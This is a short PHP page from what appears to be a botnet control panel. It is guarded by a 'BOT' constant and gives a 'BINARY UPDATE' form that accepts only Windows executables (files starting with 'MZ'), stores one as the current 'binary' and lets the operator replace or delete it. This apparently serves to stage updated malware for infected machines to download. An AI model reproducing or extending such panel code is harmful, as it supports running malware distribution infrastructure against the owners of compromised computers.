<?php

	if (!BOT) exit();



	if ($_POST['delete']) {
		unlink('../data/binaries/binary');
	}
	elseif (!empty($_FILES)) {
		$DATA = file_get_contents($_FILES['binfile']['tmp_name']);
		if ($DATA{0}=='M' and $DATA{1}=='Z') file_put_contents('../data/binaries/binary', $DATA);
	}


	clearstatcache();
	$STAT = @stat('../data/binaries/binary');

	print "<form method=post enctype=multipart/form-data>
<table cellspacing=1 cellpadding=0 class=block>
	<tr>
		<td width=250px><b>BINARY UPDATE<br><br>";


	if ($STAT['mtime']) print "		file size: {$STAT['size']} bytes<br>
		uploaded: ".date("d/m/Y - H:i:s", $STAT['mtime'])."</b><br><br>
		<input type=submit class=button name='delete' value='DELETE'>";


	print "</td>
		<td><input type=file style='width:200px;' name='binfile'> <input type=submit class=button value='GO'></td>
	</tr>
</table>
</form>";

?>